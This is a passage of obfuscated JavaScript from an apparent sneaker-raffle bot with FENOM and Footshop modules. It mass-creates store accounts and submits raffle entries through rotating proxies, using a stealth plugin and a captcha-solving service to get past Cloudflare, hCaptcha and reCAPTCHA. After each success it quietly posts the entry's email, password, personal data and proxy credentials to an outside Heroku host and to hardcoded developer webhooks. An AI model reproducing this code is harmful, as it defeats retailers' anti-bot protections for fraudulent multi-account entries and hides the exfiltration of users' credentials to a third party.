                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Retrying\x20(' + _0x133942 + '\x20/\x205)')), _0x3ae296 = _0x3ae296 - 0x1, _0x133942 = _0x133942 + 0x1;
                                continue;
                            }
                            _0x18c823 == 'yes' && _0x133942 >= 0x5 && (_0x5925c7(_0x33eb99[_0x3ae296], _0x463ad4), _0x18c823 = 'no', _0x133942 = 0x0), console['log']('Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0xf58dfa, _0x9bcf6e, _0x5757ff) {
                    var _0x1beec7 = _0x9bcf6e, _0x2f3835 = 0x0;
                    for (var _0x15f1eb = 0x0; _0x15f1eb < _0x9bcf6e['length']; _0x15f1eb++) {
                        maxTasks = Number(_0x51d52a['threads']);
                        while (_0x2f3835 >= maxTasks) {
                            await _0x116d4a(_0x51d52a['delay']);
                        }
                        let _0x43350b = ![];
                        async function _0x683ecf(_0x16125f, _0x2bae95, _0x295523, _0x4653ba, _0x5c762b) {
                            _0x2f3835++, _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x51d52a['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x4f1465 != 'yes')
                                var _0x4f1465 = '', _0x5c762b = 0x0;
                            var _0x47561b;
                            try {
                                await _0x2c2316(_0x2bae95, _0x4653ba);
                            } catch {
                                _0x4f1465 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x244762(_0x16125f['name'] + '\x20Task\x20' + (_0x4653ba + 0x1) + '\x20/\x20' + _0x2bae95['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
                            var _0x585bd9 = await _0x2520f4(_0x2bae95[_0x4653ba], _0x16125f, 'acc', ![]);
                            const _0x13aa06 = { 'succesDEVMSG': { 'embeds': [_0x585bd9] } }, _0x38a7b5 = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x1a014a = Math['round'](Math['random']() * (_0x295523['length'] - 0x1)), _0x39b8e1 = _0x295523[_0x1a014a]['split'](':'), _0x3293e6;
                            async function _0x43dd82(_0x12b9b2) {
                                const _0x491c67 = _0x65e0bc['readFileSync']('../accounts/fenom.csv', 'utf8'), _0xa5fc23 = _0x3e0e2d['parse'](_0x491c67, { 'header': !![] })['data'];
                                let _0x189964 = ![];
                                for (var _0x1e9af0 of _0xa5fc23) {
                                    if (_0x1e9af0['Email'] == _0x12b9b2['Email']) {
                                        _0x189964 = !![];
                                        break;
                                    }
                                }
                                return _0x189964;
                            }
                            try {
                                if (await _0x43dd82(_0x2bae95[_0x4653ba]) == !![]) {
                                    console['log'](_0x3982db() + '\x20[' + _0x16125f['name'] + ']\x20Task\x20' + (_0x4653ba + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x43350b = !![], dupli = !![];
                                    return;
                                }
                                try {
                                    _0x3293e6 = await _0x5d136d['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x39b8e1[0x0] + ':' + _0x39b8e1[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x3293e6 = await _0x5d136d['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x39b8e1[0x0] + ':' + _0x39b8e1[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x506b8e = await _0x3293e6['newPage']();
                                await _0x506b8e['setViewport']({
                                    'width': 0x500 + _0x1053b1(0x1, 0x32),
                                    'height': 0x2d9 + _0x1053b1(0x1, 0x32)
                                });
                                const _0x25c925 = await _0x506b8e['target']()['createCDPSession'](), { windowId: _0x3a8d67 } = await _0x25c925['send']('Browser.getWindowForTarget');
                                await _0x506b8e['authenticate']({
                                    'username': '' + _0x39b8e1[0x2],
                                    'password': '' + _0x39b8e1[0x3]
                                }), console['log'](_0x3982db() + '\x20[' + _0x16125f['name'] + ']\x20Task\x20' + (_0x4653ba + 0x1) + '\x20:\x20Getting\x20Session'), await _0x506b8e['goto']('' + _0x38a7b5, { 'waitUntil': 'networkidle2' }), console['log'](_0x3982db() + '\x20[' + _0x16125f['name'] + ']\x20Task\x20' + (_0x4653ba + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x116d4a(0x1388);
                                var _0x49e543 = await _0x506b8e['$']('.hcaptcha-box');
                                if (_0x49e543) {
                                    console['log'](_0x3982db() + '\x20[' + _0x16125f['name'] + ']\x20Task\x20' + (_0x4653ba + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x116d4a(0x2710);
                                    const _0x13a04e = await _0x506b8e['$']('.hcaptcha-box');
                                    if (_0x13a04e)
                                        try {
                                            await _0x13a04e['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x506b8e['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0xf35bd2 = await _0x506b8e['$']('.hcaptcha-box');
                                        if (_0xf35bd2)
                                            try {
                                                await _0xf35bd2['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x506b8e['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x25c925['send']('Browser.setWindowBounds', {
                                        'windowId': _0x3a8d67,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0x116d4a(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0x3982db() + '\x20[' + _0x16125f['name'] + ']\x20Task\x20' + (_0x4653ba + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x506b8e['type']('input[name=\x22firstname\x22]', '' + _0x2bae95[_0x4653ba]['FirstName']), await _0x116d4a(0x1f4), await _0x506b8e['type']('input[name=\x22lastname\x22]', '' + _0x2bae95[_0x4653ba]['LastName']), await _0x116d4a(0x1f4), await _0x506b8e['type']('input[name=\x22email\x22]', '' + _0x2bae95[_0x4653ba]['Email']), await _0x116d4a(0x1f4), await _0x506b8e['type']('input[name=\x22password\x22]', '' + _0x2bae95[_0x4653ba]['Password']), await _0x116d4a(0x258), await _0x506b8e['$eval']('input[name=\x22psgdpr\x22]', _0x8bfe7f => _0x8bfe7f['click']()), await _0x116d4a(0x1f4), console['log'](_0x3982db() + '\x20[' + _0x16125f['name'] + ']\x20Task\x20' + (_0x4653ba + 0x1) + '\x20:\x20Sending\x20Request'), await _0x506b8e['$eval']('#customer-form', _0x26c943 => _0x26c943['submit']());
                                try {
                                    try {
                                        await _0x506b8e['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x4f1465 = 'no', console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x16125f['name'] + ']\x20Task\x20' + (_0x4653ba + 0x1) + '\x20:\x20Account\x20' + _0x2bae95[_0x4653ba]['Email'] + '\x20Generated')), _0x65e0bc['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x2bae95[_0x4653ba]['Email'] + ',' + _0x2bae95[_0x4653ba]['Password']);
                                    let _0x1eb88c = _0x2bae95[_0x4653ba];
                                    try {
                                        prxdata = {
                                            'username': _0x358285['replace']('#', ''),
                                            'module': _0x16125f['name'],
                                            'entrydata': JSON['stringify'](_0x1eb88c),
                                            'proxy': '' + _0x295523[_0x4653ba]
                                        };
                                        var _0x36cb3b = JSON['stringify'](prxdata);
                                        let _0x52d6be = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x36cb3b, _0x52d6be);
                                    } catch (_0x41a53c) {
                                    }
                                    try {
                                        _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x13aa06['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0x3c7bbe(_0x431ce7, _0x13aa06['succesDEVMSG']);
                                } catch (_0x4b10cd) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0x54f85c) {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x16125f['name'] + ']\x20Task\x20' + (_0x4653ba + 0x1) + '\x20:\x20' + _0x54f85c)), _0x47561b = '' + _0x54f85c;
                                var _0x56ed3f = await _0x2520f4(_0x2bae95[_0x4653ba], _0x16125f, 'acc', !![], _0x47561b);
                                _0x13aa06['errorDEV'] = { 'embeds': [_0x56ed3f] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x13aa06['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x13aa06['errorDEV']), _0x4f1465 = 'yes';
                            } finally {
                                _0x3293e6 && _0x3293e6['close']();
                                if (_0x4f1465 == 'yes' && _0x5c762b != 0x5)
                                    return console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x16125f['name'] + ']\x20Task\x20' + (_0x4653ba + 0x1) + '\x20:\x20Retrying\x20(' + _0x5c762b + '\x20/\x205)')), _0x5c762b = _0x5c762b + 0x1, _0x2f3835--, _0x683ecf(_0x16125f, _0x2bae95, _0x295523, _0x4653ba, _0x5c762b);
                                _0x4f1465 == 'yes' && _0x5c762b >= 0x5 && _0x5925c7(_0x2bae95[_0x4653ba], _0x16125f), !_0x43350b && (console['log'](_0x3982db() + '\x20[' + _0x16125f['name'] + ']\x20Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay'])), _0x2f3835--;
                            }
                        }
                        _0x683ecf(_0xf58dfa, _0x1beec7, _0x5757ff, _0x15f1eb), !_0x43350b && await _0x116d4a(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x3425eb(_0x4036da, _0x28cb4b, _0x365373) {
                    _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x51d52a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x49ec98 = 0x0; _0x49ec98 < _0x28cb4b['length']; _0x49ec98++) {
                        if (_0x5cae37 != 'yes')
                            var _0x5cae37 = '', _0x390182 = 0x0;
                        var _0x21e95c;
                        try {
                            await _0x2c2316(_0x28cb4b, _0x49ec98);
                        } catch {
                            _0x5cae37 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x244762(_0x4036da['name'] + '\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20/\x20' + _0x28cb4b['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
                        const _0xd3dc06 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x4b74eb = Math['round'](Math['random']() * (_0x365373['length'] - 0x1)), _0x19c24a = _0x365373[_0x4b74eb]['split'](':'), _0x12c70d;
                        try {
                            _0x12c70d = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x19c24a[0x0] + ':' + _0x19c24a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x12c70d = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x19c24a[0x0] + ':' + _0x19c24a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x41ad23 = await _0x12c70d['newPage'](), _0x4fbec9 = await _0x41ad23['target']()['createCDPSession'](), { windowId: _0x1deaf5 } = await _0x4fbec9['send']('Browser.getWindowForTarget');
                            await _0x41ad23['authenticate']({
                                'username': '' + _0x19c24a[0x2],
                                'password': '' + _0x19c24a[0x3]
                            }), console['log'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x41ad23['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x116d4a(0x1388);
                            var _0x4dadad = await _0x41ad23['$']('.hcaptcha-box');
                            if (_0x4dadad) {
                                console['log'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x116d4a(0x2710);
                                const _0x22f8f1 = await _0x41ad23['$']('.hcaptcha-box');
                                if (_0x22f8f1)
                                    try {
                                        await _0x22f8f1['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x41ad23['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x4d4ab0 = await _0x41ad23['$']('.hcaptcha-box');
                                    if (_0x4d4ab0)
                                        try {
                                            await _0x4d4ab0['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0x4fbec9['send']('Browser.setWindowBounds', {
                                'windowId': _0x1deaf5,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x116d4a(0x1f40);
                            try {
                                await _0x41ad23['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x116d4a(0x1388), console['log'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20Logging\x20in'), await _0x41ad23['type']('input[name=\x22email\x22]', '' + _0x28cb4b[_0x49ec98]['Email']), await _0x116d4a(0x1f4), await _0x41ad23['type']('input[name=\x22password\x22]', '' + _0x28cb4b[_0x49ec98]['Password']), await _0x116d4a(0x258), await _0x41ad23['$eval']('#login-form', _0xa707ba => _0xa707ba['submit']()), await _0x41ad23['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x116d4a(0x1f4), await _0x41ad23['goto']('' + _0x28cb4b[_0x49ec98]['Url']), await _0x41ad23['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x28cb4b[_0x49ec98]['Size']);
                            if (_0x28cb4b[_0x49ec98]['Size'] != 'RANDOM') {
                                var _0x996491 = '\x20' + _0x28cb4b[_0x49ec98]['Size'] + '\x20';
                                const _0x5b0f3f = await _0x41ad23['$x']('//span[contains(text(),\x20' + _0x996491 + ')]');
                                await _0x5b0f3f[0x0]['click']();
                            } else {
                                const _0x4170a9 = await _0x41ad23['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x1efd30 = Math['round'](Math['random']() * (_0x4170a9['length'] - 0x1));
                                await _0x4170a9[_0x1efd30]['click']();
                            }
                            await _0x116d4a(0x258), await _0x41ad23['click']('#cookieChoiceDismiss'), await _0x116d4a(0x3e8), await _0x41ad23['type']('#instagram-account', '' + _0x28cb4b[_0x49ec98]['Follower']), await _0x116d4a(0x28a), await _0x41ad23['click']('#book-btn'), await _0x116d4a(0xbb8);
                            try {
                                await _0x41ad23['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x116d4a(0x1f4), console['log'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20' + _0x1403a4['cyan']('Solving\x20Captcha')), await _0x41ad23['solveRecaptchas'](), console['log'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x116d4a(0x7d0), await _0x41ad23['$eval']('#book-btn-for-sure', _0x2e321d => _0x2e321d['click']()), await _0x116d4a(0x12c), await _0x41ad23['click']('#book-btn-for-sure'), await _0x116d4a(0xdac);
                            const _0x3626b0 = await _0x41ad23['$eval']('.reservation-popup\x20>\x20.title', _0xa61dc8 => {
                                return _0xa61dc8['innerHTML'];
                            });
                            if (_0x3626b0) {
                                _0x5cae37 = 'no', _0x523ce4(_0x28cb4b[_0x49ec98], _0x4036da), console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x3b5a2a = await _0x2520f4(_0x28cb4b[_0x49ec98], _0x4036da, 'dev', ![]), _0x1e91ba = await _0x2520f4(_0x28cb4b[_0x49ec98], _0x4036da, 'pub', ![]);
                                let _0x34a495 = _0x28cb4b[_0x49ec98];
                                try {
                                    prxdata = {
                                        'username': _0x358285['replace']('#', ''),
                                        'module': _0x4036da['name'],
                                        'entrydata': JSON['stringify'](_0x34a495),
                                        'proxy': '' + _0x365373[_0x49ec98]
                                    };
                                    var _0x26e926 = JSON['stringify'](prxdata);
                                    let _0x39c589 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x26e926, _0x39c589);
                                } catch (_0x43cf9e) {
                                }
                                const _0x345f34 = {
                                    'succesDEVMSG': { 'embeds': [_0x3b5a2a] },
                                    'succesPUBMSG': { 'embeds': [_0x1e91ba] }
                                };
                                try {
                                    _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x345f34['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x345f34['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x55a106, _0x345f34['succesPUBMSG']);
                                } catch (_0x44e3d4) {
                                    console['log'](_0x1403a4['yellow'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x44e3d4));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x5214ef) {
                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20' + _0x5214ef)), _0x21e95c = '' + _0x5214ef;
                            var _0x39f961 = await _0x2520f4(_0x28cb4b[_0x49ec98], _0x4036da, 'dev', !![], _0x21e95c), _0x3b5a2a = await _0x2520f4(_0x28cb4b[_0x49ec98], _0x4036da, 'dev', ![]), _0x1e91ba = await _0x2520f4(_0x28cb4b[_0x49ec98], _0x4036da, 'pub', ![]);
                            const _0x253d33 = {
                                'succesDEVMSG': { 'embeds': [_0x3b5a2a] },
                                'succesPUBMSG': { 'embeds': [_0x1e91ba] }
                            };
                            _0x253d33['errorDEV'] = { 'embeds': [_0x39f961] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x253d33['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x253d33['errorDEV']), _0x5214ef != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x5cae37 = 'yes');
                        } finally {
                            _0x12c70d['close']();
                            if (_0x5cae37 == 'yes' && _0x390182 != 0x5 && _0x21e95c != 'Size\x20Not\x20Found') {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20Retrying\x20(' + _0x390182 + '\x20/\x205)')), _0x49ec98 = _0x49ec98 - 0x1, _0x390182 = _0x390182 + 0x1;
                                continue;
                            }
                            _0x5cae37 == 'yes' && _0x390182 >= 0x5 && (_0x5925c7(_0x28cb4b[_0x49ec98], _0x4036da), _0x5cae37 = 'no', _0x390182 = 0x0), console['log'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x352419, _0x2e043e, _0x9becd4) {
                _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x51d52a['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x31f5cd = 0x0; _0x31f5cd < _0x2e043e['length']; _0x31f5cd++) {
                    var _0x167901;
                    if (_0x3944a6 != 'yes')
                        var _0x3944a6 = '', _0x287ba4 = 0x0;
                    var _0x285cca = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x358285
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x2e043e[_0x31f5cd]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x2e043e[_0x31f5cd]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x51d52a['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x3b2d4c
                            }
                        ]
                    }], _0x2c4263 = await _0x2520f4(_0x2e043e[_0x31f5cd], _0x352419, 'dev', ![]), _0xe3e1fb = await _0x2520f4(_0x2e043e[_0x31f5cd], _0x352419, 'pub', ![]);
                    const _0x1a98e8 = {
                        'succesDEVMSG': { 'embeds': [_0x2c4263] },
                        'succesPUBMSG': { 'embeds': [_0xe3e1fb] }
                    }, _0x2257c7 = { 'embeds': _0x285cca };
                    try {
                        await _0x2c2316(_0x2e043e, _0x31f5cd);
                    } catch {
                        _0x3944a6 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x2e043e[_0x31f5cd]['Email'] == '' || _0x2e043e[_0x31f5cd]['FirstName'] == '' || _0x2e043e[_0x31f5cd]['LastName'] == '' || _0x2e043e[_0x31f5cd]['Country'] == '' || _0x2e043e[_0x31f5cd]['Size'] == '' || _0x2e043e[_0x31f5cd]['Address1'] == '' || _0x2e043e[_0x31f5cd]['Zip'] == '') {
                        console['log'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x2e043e[_0x31f5cd]['Email'] == '' || _0x2e043e[_0x31f5cd]['FirstName'] == '' || _0x2e043e[_0x31f5cd]['LastName'] == '' || _0x2e043e[_0x31f5cd]['Country'] == '' || _0x2e043e[_0x31f5cd]['Size'] == '' || _0x2e043e[_0x31f5cd]['Address1'] == '' || _0x2e043e[_0x31f5cd]['Zip'] == '' || _0x2e043e[_0x31f5cd]['Phone'] == '') {
                        console['log'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x4617be = '' + _0x2e043e[_0x31f5cd]['Url'];
                    if (_0x51d52a['useRandomProxy'] = ![])
                        var _0x58c073 = _0x9becd4[_0x31f5cd]['split'](':');
                    else
                        var _0x1d9368 = Math['round'](Math['random']() * (_0x9becd4['length'] - 0x1)), _0x58c073 = _0x9becd4[_0x1d9368]['split'](':');
                    var _0x2ba9db;
                    try {
                        _0x2ba9db = await _0x5d136d['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x58c073[0x0] + ':' + _0x58c073[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x2ba9db = await _0x5d136d['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x58c073[0x0] + ':' + _0x58c073[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x55b687 = await _0x2ba9db['newPage']();
                        await _0x55b687['authenticate']({
                            'username': '' + _0x58c073[0x2],
                            'password': '' + _0x58c073[0x3]
                        }), console['log'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Getting\x20Session'), await _0x55b687['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x55b687['setRequestInterception'](!![]), _0x55b687['on']('request', _0x4a6fee => {
                            _0x4a6fee['resourceType']() === 'image' || _0x4a6fee['resourceType']() === 'font' || _0x4a6fee['resourceType']() === 'media' ? _0x4a6fee['abort']() : _0x4a6fee['continue']();
                        });
                        try {
                            await _0x55b687['goto'](_0x4617be), await _0x116d4a(0xbb8), await _0x55b687['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x55b687['click']('.control__JhutY'), await _0x116d4a(0x1f4);
                        if (_0x2e043e[_0x31f5cd]['Size'] != 'RANDOM')
                            try {
                                const _0x1a5340 = await _0x55b687['$x']('//div[contains(text(),\x20\x27' + _0x2e043e[_0x31f5cd]['Size'] + '\x27)]');
                                await _0x1a5340[0x0]['click']();
                            } catch {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x4356c4 = await _0x55b687['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x2b3e77 = Math['round'](Math['random']() * (_0x4356c4['length'] - 0x1));
                            await _0x4356c4[_0x2b3e77]['click']();
                        }
                        await _0x116d4a(0x4b0);
                        const _0x4497e1 = await _0x55b687['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x4497e1[0x0]['click'](), await _0x55b687['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x55b687['type']('input[name=\x22email\x22]', '' + _0x2e043e[_0x31f5cd]['Email']), await _0x116d4a(0x640), await _0x55b687['type']('input[name=\x22phone\x22]', '' + _0x2e043e[_0x31f5cd]['Phone']), await _0x116d4a(0x4b0), await _0x55b687['click']('button.btn.continue-button__1RtsS'), await _0x116d4a(0x4b0);
                        try {
                            await _0x55b687['type']('input[name=\x22firstName\x22]', '' + _0x2e043e[_0x31f5cd]['FirstName']), await _0x116d4a(0x258);
                        } catch {
                            const _0x2ee95f = await _0x55b687['$$eval']('.invalid-feedback\x20>\x20div', _0x1a7fc4 => {
                                return _0x1a7fc4['map'](_0x114804 => _0x114804['innerText']);
                            });
                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20' + _0x2ee95f));
                            continue;
                        }
